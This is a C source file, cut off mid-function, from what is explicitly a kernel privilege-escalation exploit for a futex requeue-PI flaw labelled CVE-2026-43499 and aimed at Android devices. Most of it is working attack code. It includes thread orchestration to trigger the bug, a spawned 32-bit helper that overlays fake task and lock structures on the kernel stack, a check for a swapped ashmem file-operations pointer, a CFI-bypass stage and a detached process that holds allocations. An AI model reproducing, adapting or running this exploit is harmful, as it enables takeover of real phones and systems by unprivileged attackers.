#include "common.h"

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
uint32_t f_pi_sanitize;
atomic_int route_waiter_core;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int sanitize_ready;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int consumer_walk_us;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
atomic_int consumer_nice_val;
int memfd_leak;

#ifndef RMG_DIAG_WAITER_CORE
#define RMG_DIAG_WAITER_CORE (-1)
#endif
#ifndef RMG_DIAG_CONSUMER_CORE
#define RMG_DIAG_CONSUMER_CORE CONSUMER_CORE
#endif

#if RMG_DIAG_WAITER_CORE >= 0
#if !defined(RMG_DIAG_COW_TRACE) || !RMG_DIAG_COW_TRACE || \
    !defined(RMG_DIAG_PASSIVE_COW_OBSERVER) || \
    !RMG_DIAG_PASSIVE_COW_OBSERVER || \
    !defined(RMG_DIAG_COW_CONSUMER_AFFINITY) || \
    !RMG_DIAG_COW_CONSUMER_AFFINITY || \
    !defined(RMG_DIAG_PI_PROBE_ONLY) || !RMG_DIAG_PI_PROBE_ONLY || \
    !defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) || \
    !RMG_DIAG_UCLAMP_TRIGGER_ONLY
#error "fixed waiter affinity requires guarded PI/uclamp COW tracing"
#endif
#endif
#if RMG_DIAG_CONSUMER_CORE != CONSUMER_CORE && \
    (!defined(RMG_DIAG_COW_CONSUMER_AFFINITY) || \
     !RMG_DIAG_COW_CONSUMER_AFFINITY)
#error "fixed consumer affinity requires the guarded consumer affinity diagnostic"
#endif

#if defined(RMG_DIAG_COW_PARENT_AFFINITY_ONLY) && \
    RMG_DIAG_COW_PARENT_AFFINITY_ONLY
#if !defined(RMG_DIAG_COW_ONLY) || !RMG_DIAG_COW_ONLY || \
    !defined(RMG_DIAG_COW_REQUIRE_CPUS_67) || \
    !RMG_DIAG_COW_REQUIRE_CPUS_67
#error "parent-affinity-only diagnostics require COW-only CPU 6/7 guard mode"
#endif
#endif

/* Shared memory for cross-process waiter32 communication.
 * Layout mirrors waiter32.c's SHM_* offsets. */
#define W32_SHM_STATE         0x000
#define W32_SHM_WAITER_PID    0x004
#define W32_SHM_FUTEX_RET     0x008
#define W32_SHM_SOCK_FD       0x00c
#define W32_SHM_FAKE_TASK     0x010
#define W32_SHM_FAKE_LOCK     0x018
#define W32_SHM_PRIO          0x020
#define W32_SHM_CORE          0x024
#define W32_SHM_OWNER_STARTED 0x028
#define W32_SHM_OWNER_CHAIN   0x02c
#define W32_SHM_F_WAIT        0x100
#define W32_SHM_F_PI_TARGET   0x200
#define W32_SHM_F_PI_CHAIN    0x300
#define W32_SHM_SIZE          0x1000

static volatile uint8_t *w32_shm;
static int w32_shm_fd = -1;
static pid_t w32_pid;
static int w32_stream_pair[2] = {-1, -1};

static inline uint32_t w32_r32(int off) {
    return __atomic_load_n((volatile uint32_t *)(w32_shm + off),
                           __ATOMIC_ACQUIRE);
}
static inline void w32_w32(int off, uint32_t v) {
    __atomic_store_n((volatile uint32_t *)(w32_shm + off), v,
                     __ATOMIC_RELEASE);
}
static inline void w32_w64(int off, uint64_t v) {
    __atomic_store_n((volatile uint32_t *)(w32_shm + off),
                     (uint32_t)(v & 0xffffffff), __ATOMIC_RELEASE);
    __atomic_store_n((volatile uint32_t *)(w32_shm + off + 4),
                     (uint32_t)(v >> 32), __ATOMIC_RELEASE);
}

/* Pointers to the shared-memory futex words (used by owner_thread
 * and the CMP_REQUEUE_PI call in the main thread). */
static uint32_t *w32_f_wait;
static uint32_t *w32_f_pi_target;
static uint32_t *w32_f_pi_chain;

void *sanitize_holder_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  futex_op(&f_pi_sanitize, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&sanitize_ready, 1);
  while (atomic_load(&sanitize_ready) == 1) {
    usleep(5000);
  }
  futex_op(&f_pi_sanitize, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

atomic_int route_in_handler;
atomic_int ghost_bug_armed;
atomic_int waiter_futex_returned;

static void noop_signal_handler(int sig) { (void)sig; }

static void ghost_usr1_handler(int sig) {
  (void)sig;
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("readiness-signal-handler-entry",
                      (unsigned long long)syscall(SYS_gettid),
                      (unsigned long long)atomic_load(&waiter_tid));
#endif
  if (atomic_load(&waiter_futex_returned))
    return;
  if (!atomic_load(&ghost_bug_armed))
    return;
  atomic_store(&route_in_handler, 1);
  {
    static const char go[] = "[HANDLER] overlay route start\n";
    syscall(SYS_write, 2, go, sizeof(go) - 1);
  }
  if (getenv("READINESS_PAUSE"))
    do_readiness_pause_route();
  else
    do_pselect_fake_lock_route();
  {
    static const char done[] = "[HANDLER] overlay route done\n";
    syscall(SYS_write, 2, done, sizeof(done) - 1);
  }
}

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  int requested_core = CORE;
#if RMG_DIAG_WAITER_CORE >= 0
  requested_core = RMG_DIAG_WAITER_CORE;
#endif
  int selected_core = pin_to_core_ex(requested_core, -1);
  atomic_store(&route_waiter_core, selected_core);
#if RMG_DIAG_WAITER_CORE >= 0
  pr_info("RMG_DIAG_WAITER_PIN requested=%d selected=%d sched_cpu=%d\n",
          requested_core, selected_core, sched_getcpu());
#endif

  sigset_t blocked;
  sigfillset(&blocked);
  sigdelset(&blocked, SIGUSR1);
  sigdelset(&blocked, SIGUSR2);
  pthread_sigmask(SIG_SETMASK, &blocked, NULL);

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  atomic_store(&waiter_futex_returned, 1);

  if (!atomic_load(&route_in_handler)) {
    if (getenv("READINESS_PAUSE"))
      do_readiness_pause_route();
    else
      do_pselect_fake_lock_route();
  }
  atomic_store(&route_done, 1);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

#if defined(RMG_DIAG_COW_CONSUMER_AFFINITY) && \
    RMG_DIAG_COW_CONSUMER_AFFINITY
#if !defined(RMG_DIAG_COW_TRACE) || !RMG_DIAG_COW_TRACE || \
    !defined(RMG_DIAG_PASSIVE_COW_OBSERVER) || \
    !RMG_DIAG_PASSIVE_COW_OBSERVER || \
    ((!defined(RMG_DIAG_COW_ONLY) || !RMG_DIAG_COW_ONLY) && \
     (!defined(RMG_DIAG_PI_PROBE_ONLY) || !RMG_DIAG_PI_PROBE_ONLY || \
      !defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) || \
      !RMG_DIAG_UCLAMP_TRIGGER_ONLY))
#error "consumer affinity diagnostic requires COW-only or guarded PI mode with passive COW tracing"
#endif
static unsigned long long rmg_diag_consumer_affinity_mask64(
    const cpu_set_t *mask) {
  unsigned long long bits = 0;
  for (int cpu = 0; cpu < 64 && cpu < CPU_SETSIZE; cpu++) {
    if (CPU_ISSET(cpu, mask))
      bits |= 1ULL << cpu;
  }
  return bits;
}

static void rmg_diag_log_consumer_affinity(const char *phase,
                                           int requested, int avoid) {
  cpu_set_t mask;
  CPU_ZERO(&mask);
  errno = 0;
  int ret = sched_getaffinity(0, sizeof(mask), &mask);
  int saved_errno = ret == 0 ? 0 : errno;
  pr_info("COW_CONSUMER_AFFINITY phase=%s tid=%ld requested=%d avoid=%d "
          "sched_cpu=%d getaffinity=%d errno=%d mask=%016llx\n",
          phase, (long)syscall(SYS_gettid), requested, avoid, sched_getcpu(),
          ret, saved_errno,
          ret == 0 ? rmg_diag_consumer_affinity_mask64(&mask) : 0);
}

static int rmg_diag_pin_consumer_with_allowed_affinity(size_t requested,
                                                        int avoid) {
  int requested_core = (int)requested;
  rmg_diag_log_consumer_affinity("before-widen", requested_core, avoid);

  cpu_set_t all_cpus;
  memset(&all_cpus, 0xff, sizeof(all_cpus));
  errno = 0;
  int widen_ret = sched_setaffinity(0, sizeof(all_cpus), &all_cpus);
  int widen_errno = widen_ret == 0 ? 0 : errno;
  pr_info("COW_CONSUMER_AFFINITY_WIDEN tid=%ld result=%d errno=%d\n",
          (long)syscall(SYS_gettid), widen_ret, widen_errno);
  rmg_diag_log_consumer_affinity("after-widen", requested_core, avoid);

  int pinned = pin_to_core_ex(requested, avoid);
  rmg_diag_log_consumer_affinity("after-pin", requested_core, avoid);
  pr_info("COW_CONSUMER_PIN requested=%d avoid=%d selected=%d\n",
          requested_core, avoid, pinned);
  return pinned;
}
#endif

/* owner_thread for the waiter32 path: uses shared-memory futex words. */
void *owner_thread_w32(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(w32_f_pi_target, FUTEX_LOCK_PI, 0, NULL,
                              NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  /* Tell waiter32 that the owner holds f_pi_target */
  w32_w32(W32_SHM_OWNER_STARTED, 1);
  atomic_store(&owner_started, 1);

  /* Lock the chain -- blocks until waiter32 unlocks it after futex return */
  futex_op(w32_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  w32_w32(W32_SHM_OWNER_CHAIN, 1);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
#if RMG_DIAG_PI_FUTEX_CALL_TRACE
  int owner_tid = (int)syscall(SYS_gettid);
  pr_info("pi-futex call=owner-chain phase=enter tid=%d uaddr=%p\n",
          owner_tid, (void *)&f_pi_chain);
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint_text(
      "pi-futex-owner-enter", owner_tid,
      (unsigned long long)(uintptr_t)&f_pi_chain,
      "call=owner-chain,op=FUTEX_LOCK_PI,phase=enter");
#endif
  errno = 0;
  long chain_ret = futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  int chain_errno = errno;
  pr_info("pi-futex call=owner-chain phase=exit tid=%d uaddr=%p "
          "ret=%ld errno=%d\n",
          owner_tid, (void *)&f_pi_chain, chain_ret, chain_errno);
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint_text("pi-futex-owner-return", owner_tid,
                           (unsigned long long)(uintptr_t)&f_pi_chain,
                           "call=owner-chain,phase=return");
#endif
#else
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
#endif
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
#if defined(RMG_DIAG_COW_CONSUMER_AFFINITY) && \
    RMG_DIAG_COW_CONSUMER_AFFINITY
  /* waiter_thread is created immediately before this thread. Wait until it
   * publishes its actual pinned CPU so the fallback cannot collide with it. */
  while (!atomic_load_explicit(&waiter_ready, memory_order_acquire)) {
    usleep(1000);
  }
  int waiter_core = atomic_load_explicit(&route_waiter_core,
                                         memory_order_acquire);
  rmg_diag_pin_consumer_with_allowed_affinity(
      RMG_DIAG_CONSUMER_CORE, waiter_core);
#else
  pin_to_core_ex(RMG_DIAG_CONSUMER_CORE,
                 atomic_load(&route_waiter_core));
#endif

  {
    int self = (int)syscall(SYS_gettid);
    struct timespec b0;
    clock_gettime(CLOCK_MONOTONIC, &b0);
    (void)sched_setattr_tid_nochange(self);
    struct timespec b1;
    clock_gettime(CLOCK_MONOTONIC, &b1);
    long long base_us = (long long)(b1.tv_sec - b0.tv_sec) * 1000000LL +
                        (b1.tv_nsec - b0.tv_nsec) / 1000LL;
    pr_info("consumer baseline self-sched_setattr us=%lld\n", base_us);
  }

  int seen = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        errno = 0;
        int nice = atomic_load(&consumer_nice_val) + 7;
        if (nice > 19) nice = 19;
        atomic_store(&consumer_nice_val, nice);
        struct timespec t0;
        clock_gettime(CLOCK_MONOTONIC, &t0);
        long sched_ret = sched_setattr_tid(tid, nice);
        int sched_errno = errno;
        struct timespec t1;
        clock_gettime(CLOCK_MONOTONIC, &t1);
        long long walk_us = (long long)(t1.tv_sec - t0.tv_sec) * 1000000LL +
                            (t1.tv_nsec - t0.tv_nsec) / 1000LL;
        if (walk_us < 0) {
          walk_us = 0;
        }
        if (walk_us > 1000000LL) {
          walk_us = 1000000LL;
        }
        atomic_store(&consumer_walk_us, (int)walk_us);
        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
        } else {
          pr_warning("consumer sched_setattr ret=%ld errno=%d tid=%d\n",
                     sched_ret, sched_errno, tid);
        }
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          extern int overlay_block_pipe[2];
          if (overlay_block_pipe[1] >= 0) {
            char c = 'X';
            syscall(SYS_write, overlay_block_pipe[1], &c, 1);
          }
          if (!getenv("READINESS_PAUSE")) {
            usleep(50000);
            syscall(SYS_tgkill, getpid(), tid, SIGUSR2);
          }
          break;
        }
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  f_pi_sanitize = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&sanitize_ready, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  atomic_store(&consumer_nice_val, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

static int w32_setup_shm(void) {
  w32_shm_fd = (int)syscall(SYS_memfd_create, "w32shm", MFD_CLOEXEC);
  if (w32_shm_fd < 0) {
    pr_error("waiter32 memfd_create errno=%d\n", errno);
    return -1;
  }
  if (ftruncate(w32_shm_fd, W32_SHM_SIZE) < 0) {
    pr_error("waiter32 ftruncate errno=%d\n", errno);
    close(w32_shm_fd);
    w32_shm_fd = -1;
    return -1;
  }
  w32_shm = mmap(NULL, W32_SHM_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED,
                 w32_shm_fd, 0);
  if (w32_shm == MAP_FAILED) {
    pr_error("waiter32 mmap errno=%d\n", errno);
    close(w32_shm_fd);
    w32_shm_fd = -1;
    return -1;
  }
  memset((void *)w32_shm, 0, W32_SHM_SIZE);

  w32_f_wait = (uint32_t *)(w32_shm + W32_SHM_F_WAIT);
  w32_f_pi_target = (uint32_t *)(w32_shm + W32_SHM_F_PI_TARGET);
  w32_f_pi_chain = (uint32_t *)(w32_shm + W32_SHM_F_PI_CHAIN);
  return 0;
}

static int w32_setup_blocking_socket(void) {
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, w32_stream_pair) < 0) {
    pr_error("waiter32 socketpair errno=%d\n", errno);
    return -1;
  }

  int sndbuf = 1;
  setsockopt(w32_stream_pair[0], SOL_SOCKET, SO_SNDBUF, &sndbuf,
             sizeof(sndbuf));

  /* Fill the send buffer so the next sendmmsg blocks. */
  char fill[4096];
  memset(fill, 0x42, sizeof(fill));
  for (;;) {
    int flags = MSG_DONTWAIT | MSG_NOSIGNAL;
    ssize_t n = send(w32_stream_pair[0], fill, sizeof(fill), flags);
    if (n <= 0) break;
  }

  /* Set a send timeout so the waiter32 doesn't block forever if the
   * walk doesn't unblock it. */
  struct timeval tv = {.tv_sec = 10, .tv_usec = 0};
  setsockopt(w32_stream_pair[0], SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

  /* The sender fd must survive fork+exec (no CLOEXEC). dup it to a high
   * number to avoid collisions with the exploit's fd management. */
  int sender_fd = fcntl(w32_stream_pair[0], F_DUPFD, 800);
  if (sender_fd < 0) {
    pr_error("waiter32 dupfd sender errno=%d\n", errno);
    return -1;
  }
  close(w32_stream_pair[0]);
  w32_stream_pair[0] = sender_fd;

  /* Clear CLOEXEC on the sender fd so the child inherits it */
  fcntl(sender_fd, F_SETFD, 0);

  return 0;
}

static int w32_spawn(void) {
  /* Write overlay parameters into shared memory */
  w32_w64(W32_SHM_FAKE_TASK, (uint64_t)fake_task);
  w32_w64(W32_SHM_FAKE_LOCK, (uint64_t)fake_lock);
  w32_w32(W32_SHM_PRIO, 1);
  w32_w32(W32_SHM_SOCK_FD, (uint32_t)w32_stream_pair[0]);
  w32_w32(W32_SHM_CORE, (uint32_t)CORE);
  w32_w32(W32_SHM_OWNER_STARTED, 0);
  w32_w32(W32_SHM_OWNER_CHAIN, 0);
  w32_w32(W32_SHM_STATE, 0);

  pid_t child = fork();
  if (child < 0) {
    pr_error("waiter32 fork errno=%d\n", errno);
    return -1;
  }

  if (child == 0) {
    /* Child: dup the shm fd to fd 3 (expected by waiter32) */
    if (w32_shm_fd != 3) {
      dup2(w32_shm_fd, 3);
      close(w32_shm_fd);
    }
    /* Clear CLOEXEC on fd 3 */
    fcntl(3, F_SETFD, 0);

    /* Close fds we don't need (stderr stays for diagnostics) */
    close(w32_stream_pair[1]);

    static const char w32_path[] = "/data/local/tmp/cve-2026-43499-waiter32";
    execl(w32_path, w32_path, (char *)NULL);
    _exit(127);
  }

  w32_pid = child;
  pr_info("waiter32 spawned pid=%d\n", child);
  return 0;
}

void run_waiter32_route(void) {
  reset_main_route_state();
  atomic_store(&route_in_handler, 0);
  atomic_store(&ghost_bug_armed, 0);
  atomic_store(&waiter_futex_returned, 0);

  if (w32_setup_shm() < 0) return;
  if (w32_setup_blocking_socket() < 0) return;

  pthread_t sanitize_holder;
  f_pi_sanitize = 0;
  atomic_store(&sanitize_ready, 0);
  SYSCHK(pthread_create(&sanitize_holder, NULL, sanitize_holder_thread, NULL));
  while (!atomic_load(&sanitize_ready)) {
    usleep(1000);
  }

  if (w32_spawn() < 0) return;

  /* Wait for waiter32 to be ready (state==1, has locked f_pi_chain) */
  for (int i = 0; i < 5000; i++) {
    if (w32_r32(W32_SHM_STATE) >= 1) break;
    usleep(1000);
  }
  if (w32_r32(W32_SHM_STATE) < 1) {
    pr_error("waiter32 did not reach ready state=%u\n",
             w32_r32(W32_SHM_STATE));
    kill(w32_pid, SIGKILL);
    return;
  }
  pid_t wpid = (pid_t)w32_r32(W32_SHM_WAITER_PID);
  atomic_store(&waiter_tid, (int)wpid);
  atomic_store(&waiter_ready, 1);
  atomic_store(&route_waiter_core, (int)CORE);
  pr_info("waiter32 ready pid=%d\n", wpid);

  /* Start the owner thread (uses shared-memory futex words) */
  pthread_t owner;
  SYSCHK(pthread_create(&owner, NULL, owner_thread_w32, NULL));
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  /* Wait for waiter32 to enter FUTEX_WAIT_REQUEUE_PI (state==2) */
  for (int i = 0; i < 5000; i++) {
    if (w32_r32(W32_SHM_STATE) >= 2) break;
    usleep(1000);
  }
  if (w32_r32(W32_SHM_STATE) < 2) {
    pr_error("waiter32 did not reach waiting state=%u\n",
             w32_r32(W32_SHM_STATE));
    kill(w32_pid, SIGKILL);
    return;
  }
  atomic_store(&waiter_waiting, 1);
  pr_info("waiter32 in FUTEX_WAIT_REQUEUE_PI\n");

  usleep(100000);

  /* Fire the CVE: CMP_REQUEUE_PI */
  errno = 0;
  long requeue_ret = futex_op(w32_f_wait, FUTEX_CMP_REQUEUE_PI, 1,
                              (void *)1, w32_f_pi_target, 0);
  int requeue_errno = errno;
  pr_info("CMP_REQUEUE_PI ret=%ld errno=%d (EDEADLK=%d)\n",
          requeue_ret, requeue_errno, EDEADLK);

  /* Send SIGUSR1 to the waiter32 process. The handler runs the compat
   * socketcall(SENDMMSG) overlay on the waiter's kernel stack. */
  usleep(10000);
  kill(wpid, SIGUSR1);
  pr_info("SIGUSR1 -> waiter32 pid=%d\n", wpid);

  /* Wait for the overlay to be blocking (state==4) */
  for (int i = 0; i < 5000; i++) {
    if (w32_r32(W32_SHM_STATE) >= 4) break;
    usleep(1000);
  }
  pr_info("waiter32 state=%u after SIGUSR1\n", w32_r32(W32_SHM_STATE));

  /* Start the consumer thread to fire the PI chain walk. */
  pthread_t consumer;
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_nice_val, 0);
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));

  atomic_store(&main_route_delay_usec, 10000);
  atomic_store(&punch_consume_go, 1);

  /* Wait for the consumer to complete */
  for (int i = 0; i < 3000; i++) {
    if (atomic_load(&consumer_calls) > 0) break;
    usleep(1000);
  }
  usleep(200000);
  atomic_store(&punch_consume_stop, 1);

  int calls = atomic_load(&consumer_calls);
  int success = atomic_load(&consumer_success);
  pr_info("waiter32 route walk calls=%d success=%d walk_us=%d state=%u\n",
          calls, success, atomic_load(&consumer_walk_us),
          w32_r32(W32_SHM_STATE));

  /* Check for the FOPS swap */
  int route_signal = calls > 0 && success > 0;
  if (route_signal) {
    int probe_fd = open(ashmem_path, O_RDWR | O_CLOEXEC);
    if (probe_fd >= 0) {
      char probe_buf[8] = {0};
      errno = 0;
      ssize_t probe_rd = pread(probe_fd, probe_buf, sizeof(probe_buf), 0);
      pr_info("fops probe: pread ret=%zd errno=%d\n", probe_rd, errno);
      close(probe_fd);
    }

    if (skip_cfi_stage) {
      cfi_last_step = 0;
      pr_info("skip_cfi_stage: accepting route as verified\n");
    } else if (try_cfi_stage()) {
      cfi_last_step = 0;
    } else if (!cfi_last_step) {
      cfi_last_step = 32;
    }
  } else {
    cfi_last_step = 33;
    cfi_last_errno = 0;
  }
  pr_info("waiter32 route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);

  atomic_store(&route_done, 1);

  /* Drain the blocking socket receiver to unblock waiter32's sendmmsg */
  {
    char drain[4096];
    for (int i = 0; i < 32; i++) {
      ssize_t n = recv(w32_stream_pair[1], drain, sizeof(drain),
                       MSG_DONTWAIT);
      if (n <= 0) break;
    }
  }

  /* Wait for waiter32 to exit */
  int wstatus = 0;
  for (int i = 0; i < 300; i++) {
    pid_t r = waitpid(w32_pid, &wstatus, WNOHANG);
    if (r > 0) break;
    usleep(10000);
  }
  pr_info("waiter32 exited status=%d\n", WEXITSTATUS(wstatus));

  atomic_store(&sanitize_ready, 2);
  pthread_join(sanitize_holder, NULL);
}

void run_main_route_threads(void) {
  reset_main_route_state();
  atomic_store(&route_in_handler, 0);
  atomic_store(&ghost_bug_armed, 0);
  atomic_store(&waiter_futex_returned, 0);

  extern int overlay_block_pipe[2];
  if (overlay_block_pipe[0] < 0) {
    int tmp[2];
    if (pipe2(tmp, O_CLOEXEC) == 0) {
      overlay_block_pipe[0] = fcntl(tmp[0], F_DUPFD, 900);
      overlay_block_pipe[1] = fcntl(tmp[1], F_DUPFD, 900);
      close(tmp[0]);
      close(tmp[1]);
      if (overlay_block_pipe[0] < 0 || overlay_block_pipe[1] < 0) {
        overlay_block_pipe[0] = -1;
        overlay_block_pipe[1] = -1;
      }
    }
    pr_info("overlay pipe fds: %d %d\n",
            overlay_block_pipe[0], overlay_block_pipe[1]);
  }

  {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = ghost_usr1_handler;
    sigemptyset(&sa.sa_mask);
    sigaddset(&sa.sa_mask, SIGUSR1);
    sa.sa_flags = SA_RESTART;
    sigaction(SIGUSR1, &sa, NULL);
  }
  {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = noop_signal_handler;
    sigaction(SIGUSR2, &sa, NULL);
  }

  pthread_t sanitize_holder;
  f_pi_sanitize = 0;
  atomic_store(&sanitize_ready, 0);
  SYSCHK(pthread_create(&sanitize_holder, NULL, sanitize_holder_thread, NULL));
  while (!atomic_load(&sanitize_ready)) {
    usleep(1000);
  }

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);
  errno = 0;
  long requeue_ret =
      futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  pr_info("CMP_REQUEUE_PI ret=%ld errno=%d (EDEADLK=%d)\n",
          requeue_ret, requeue_errno, EDEADLK);

  if (requeue_ret == -1 && requeue_errno == EDEADLK) {
    atomic_store(&ghost_bug_armed, 1);
    int wtid = atomic_load(&waiter_tid);
    usleep(10000);
    long kr = syscall(SYS_tgkill, getpid(), wtid, SIGUSR1);
    pr_info("SIGUSR1 -> waiter tid=%d ret=%ld\n", wtid, kr);
  }

  while (!atomic_load(&route_done)) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
      rmg_diag_checkpoint("pipe-prepare-request", getpid(), 0);
#endif
      pipebuf_page_base = prepare_pipe_buffer_page();
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
      rmg_diag_checkpoint("pipe-prepare-return", pipebuf_page_base, 0);
#endif
      atomic_store(&pipe_prepare_done, 1);
    }
    usleep(10000);
  }

  atomic_store(&sanitize_ready, 2);
  pthread_join(sanitize_holder, NULL);
}

static pid_t spawn_allocation_keeper(void) {
  pid_t child = SYSCHK(fork());
  if (child != 0) {
    return child;
  }

  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
  syscall(SYS_prctl, PR_SET_NAME, "cve43499-hold", 0, 0, 0);
  syscall(SYS_setsid);

  int null_fd = (int)syscall(
      SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
  if (null_fd >= 0) {
    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
      if (null_fd != fd) {
        syscall(SYS_dup3, null_fd, fd, 0);
      }
    }
    if (null_fd > STDERR_FILENO) {
      syscall(SYS_close, null_fd);
    }
  } else {
    syscall(SYS_close, STDIN_FILENO);
    syscall(SYS_close, STDOUT_FILENO);
    syscall(SYS_close, STDERR_FILENO);
  }

  struct timespec hold = {
    .tv_sec = 86400,
    .tv_nsec = 0,
  };
  for (;;) {
    syscall(SYS_nanosleep, &hold, NULL);
  }
}

#if defined(RMG_DIAG_COW_REQUIRE_CPUS_67) && \
    RMG_DIAG_COW_REQUIRE_CPUS_67
#if !defined(RMG_DIAG_COW_ONLY) || !RMG_DIAG_COW_ONLY
#error "CPU 6/7 preflight is restricted to COW-only diagnostics"
#endif
static unsigned long long rmg_diag_affinity_mask64(const cpu_set_t *mask) {
  unsigned long long bits = 0;
  for (int cpu = 0; cpu < 64 && cpu < CPU_SETSIZE; cpu++) {
    if (CPU_ISSET(cpu, mask))
      bits |= 1ULL << cpu;
  }
  return bits;
}

static void rmg_diag_log_proc_status(const char *label, const char *path,
                                     int full_status) {
  static const char *const fields[] = {
      "Name:", "State:", "Tgid:", "Pid:", "PPid:", "Uid:", "Gid:",
      "Cpus_allowed:", "Cpus_allowed_list:", "Mems_allowed_list:",
      "CapEff:", "NoNewPrivs:", "Seccomp:", "Seccomp_filters:",
      "NSpid:", NULL};
  FILE *fp = fopen(path, "r");
  if (fp == NULL) {
    pr_warning("RMG_COW_CPU_STATUS label=%s path=%s open_errno=%d\n", label,
               path, errno);
    return;
  }

  char line[512];
  errno = 0;
